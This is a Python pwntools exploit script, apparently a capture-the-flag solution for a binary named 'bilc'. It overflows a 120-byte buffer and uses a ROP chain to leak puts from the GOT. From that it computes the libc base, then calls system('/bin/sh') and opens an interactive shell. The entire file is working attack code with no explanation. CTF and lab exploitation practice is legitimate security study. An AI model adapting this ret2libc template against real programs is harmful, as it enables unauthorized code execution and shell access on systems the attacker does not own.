from pwn import *


elf = ELF("./to_give/bilc")
context.binary = elf

rop = ROP(elf)

libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc_path)

my_proc = process(elf.path)


start_point = 0x4011ec
puts_plt = 0x401070
#printf_plt = 0x401090
puts_got = 0x404018
#printf_got = 0x404028
gadget = 0x40119a

my_proc.recvuntil(b'Gib: ')

payload = b""
payload += b"A"*120
payload += p64(gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start_point)

my_proc.sendline(payload)
my_proc.recvline()

leaked_bytes = my_proc.recvuntil(b'Gib: ', drop=True)
leaked_bytes_clean = leaked_bytes.strip()

puts_addr = u64(leaked_bytes_clean.ljust(8, b"\x00"))
log.info('Cleaned puts address: ' + hex(puts_addr))


libc_base = puts_addr - libc.symbols['puts']
log.info('LIBC base address: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"system address: {hex(system_addr)}")
log.info(f"'/bin/sh' address: {hex(bin_sh_addr)}")


ret_gadget = rop.find_gadget(['ret'])[0]

payload2=b""
payload2 += b"A"*120
payload2 += p64(ret_gadget)
payload2 += p64(gadget)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)


my_proc.sendline(payload2)
my_proc.recvline()
my_proc.interactive()